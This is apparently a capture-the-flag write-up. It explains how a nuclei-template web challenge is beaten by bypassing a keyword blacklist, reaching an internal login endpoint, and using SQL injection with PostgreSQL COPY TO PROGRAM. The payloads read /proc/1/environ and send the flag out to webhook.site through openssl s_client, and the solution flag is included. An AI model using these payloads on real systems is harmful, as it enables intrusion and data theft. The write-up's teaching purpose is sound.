---
title: projectdiscovery
categories: Miscellaneous
authors: daffainfo
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 496
solves: 3
flags: SCH25{08c0a48cd23183321a71d385a4eb6eaa}
---

> Create your own template

---

In this challenge, we're given a website that runs nuclei as a backend to process the templates we submit. Here's a snippet of the code:

```py
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            url = request.form['url']
            template = request.form['template']

            if not re.match(r'^[a-zA-Z0-9:/\.]+$', url):
                return render_template('index.html', output='Invalid URL format.')

            if "http:" in template.lower() or "host" in template.lower() or "port" in template.lower():
                return render_template('index.html', output='Blacklisted word')

            filename = str(uuid.uuid4())
            with open(f'/tmp/{filename}.yaml', 'w') as f:
                f.write(template)

            validate_template = subprocess.Popen(
                ['/usr/local/bin/nuclei', '-nc', '-duc', '-t', f'/tmp/{filename}.yaml', '--validate'],
                stderr=subprocess.PIPE
            )
            _, stderr = validate_template.communicate()

            if "Error occurred parsing template" not in stderr.decode('utf-8'):
                process = subprocess.Popen(
                    ['/usr/local/bin/nuclei', '-nc', '-duc', '-t', f'/tmp/{filename}.yaml', '-u', url],
                    stdout=subprocess.PIPE
                )
                stdout, _ = process.communicate()

                return render_template('index.html', output="Done!")
            else:
                return render_template('index.html', output="Error when parsing the template")

        except Exception as e:
            return render_template('index.html', output=f'An unexpected error occurred: {str(e)}')

        finally:
            os.system(f'/usr/bin/rm -rf /tmp/*')
            time.sleep(5)

    return render_template('index.html')
```

From the code snippet above, we can see that several words are blacklisted, such as `http:`, `host`, and `port`. There are also internal endpoints that can only be accessed from internal IP addresses:

```py
@internal_bp.route('/login', methods=['GET', 'POST'])
@ip_required
def login():
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']

        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT * FROM accounts WHERE username = '" + username + "' AND password = '" + password + "';")
        account = cur.fetchone()
        cur.close()
        conn.close()

        if account:
            session['loggedin'] = True
            session['id'] = account['id']
            session['username'] = account['username']
            return redirect(url_for('internal.profile'))
        else:
            flash("Incorrect username/password!", "danger")

    return render_template('auth/login.html', title="Login")
```

In the endpoint above, we can see that there is an `ip_required` function that limits access to only internal IP addresses like '127.0.0.1' and '::1'. Interestingly, the SQL query used is vulnerable to SQL injection due to the lack of prepared statements. But now, how do we access this endpoint? We can use nuclei to send requests to it. Since `http:` is blacklisted in the nuclei template, we need to find another method to access the endpoint. And we found that we can use `requests:` as follows:

```yaml
id: exploit-sql-update
info:
  name: exploit-sql-update
  author: you

requests:
  - raw:
      - |
        POST /internal/login HTTP/1.1
        Content-Type: application/x-www-form-urlencoded

        username=ztzzzwashere&password=ztzzzwashere
  
    matchers:
      - type: status
        status:
          - 302
```

Now that we can access the internal endpoint, we need to exploit SQL Injection to obtain the flag. Since the database we're using is PostgreSQL, we can use the `COPY TO PROGRAM` technique to execute commands in the operating system. There are several ways to send the flag we obtain externally, one of which is by sending a request to `webhook.site`. But how?

Unfortunately, the `db` container doesn't have tools like `curl` or `wget` to send HTTP requests. However, we can use `openssl s_client` to send HTTPS requests. Here's the command we can use to send the flag to `webhook.site`:

```sh
$ printf "POST /51370ad9-5af5-455b-b288-332659287ab1/ HTTP/1.1\r\nHost: webhook.siter\nConnection: close\r\n\r\n" | openssl s_client -quiet -connect webhook.site:443 -servername webhook.site'
```

Since `Host` is blacklisted, we split it into `Ho""st`, and to get the flag, we can echo the `FLAG` variable, which contains a flag. Using `printf`, we can insert the echo output into the request we send. So the complete command is as follows:

```sh
$ printf "POST /51370ad9-5af5-455b-b288-332659287ab1/?%s HTTP/1.1\r\nHo""st: webhook.siter\nConnection: close\r\n\r\n" $(echo $FLAG) | openssl s_client -quiet -connect webhook.site:443 -servername webhook.site'
```

Here is a nuclei template to exploit the SQL Injection:

```yaml
id: exploit-sql-update
info:
  name: exploit-sql-update
  author: you

requests:
  - raw:
      - |
        POST /internal/login HTTP/1.1
        Content-Type: application/x-www-form-urlencoded

        username=' ; COPY (SELECT encode(pg_read_binary_file('/proc/1/environ'), 'base64')) TO PROGRAM 'tee /tmp/ztzzzwashere; printf "POST /51370ad9-5af5-455b-b288-332659287ab1/?%s HTTP/1.1\r\nHo""st: webhook.siter\nConnection: close\r\n\r\n" $(echo $FLAG) | openssl s_client -quiet -connect webhook.site:443 -servername webhook.site' ; -- &password=x
  
    matchers:
      - type: status
        status:
          - 302
```

We just need to send the template using the internal ip to access the internal endpoint using the url `http://127.0.0.1:1337`.
